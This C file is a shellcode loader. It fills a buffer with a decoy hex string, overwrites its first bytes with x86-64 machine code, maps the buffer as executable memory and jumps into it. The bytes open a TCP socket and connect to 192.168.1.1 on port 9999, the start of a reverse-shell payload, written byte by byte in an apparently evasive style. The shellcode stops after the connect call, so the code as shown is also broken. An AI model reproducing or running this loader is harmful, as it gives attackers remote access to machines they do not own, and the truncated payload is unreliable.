#include <sys/mman.h>
#include <string.h>


char buf[297] = "e47413608eee8065b973d913e32bc88ba9c05cba76b72119c13c0332fa6b43b7e32289ef6a5339a9a55ea40933d8ab734dce33cb210d01539dd6435ef2de5018edf3a951f8afde45c16a71e01c4f2ba5d8f9d6439bc3a7e4a03bf0ec3e4663c757d20051a601569366be793c0d5d48edd1e88ab8dd81bed8e26f9cd247185c1cb14ce1e4baf787b0e863d43291cf8a5ba4dc719c"; 

int main(void)
{


buf[0] = (char)0x6a; buf[1] = (char)0x29; buf[2] = (char)0x58; buf[3] = (char)0x99; buf[4] = (char)0x6a; buf[5] = (char)0x02; buf[6] = (char)0x5f; buf[7] = (char)0x6a; buf[8] = (char)0x01; buf[9] = (char)0x5e; buf[10] = (char)0x0f; buf[11] = (char)0x05; buf[12] = (char)0x48; buf[13] = (char)0x97; buf[14] = (char)0x48; buf[15] = (char)0xb9; buf[16] = (char)0x02; buf[17] = (char)0x00; buf[18] = (char)0x27; buf[19] = (char)0x0f; buf[20] = (char)0xc0; buf[21] = (char)0xa8; buf[22] = (char)0x01; buf[23] = (char)0x01; buf[24] = (char)0x51; buf[25] = (char)0x48; buf[26] = (char)0x89; buf[27] = (char)0xe6; buf[28] = (char)0x6a; buf[29] = (char)0x10; buf[30] = (char)0x5a; buf[31] = (char)0x6a; buf[32] = (char)0x2a; buf[33] = (char)0x58; buf[34] = (char)0x0f; buf[35] = (char)0x05; buf[36] = (char)0x6a; 

    void (*func)();
    void *exec_mem = mmap(0, sizeof(buf), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);

    // Copy buf to the executable memory
    memcpy(exec_mem, buf, sizeof(buf));

    // Assign the buf to the function pointer
    func = (void (*)())exec_mem;

    // Execute the buf
    func();

    // ...

    // Clean up
    munmap(exec_mem, sizeof(buf));

    return 0;
}
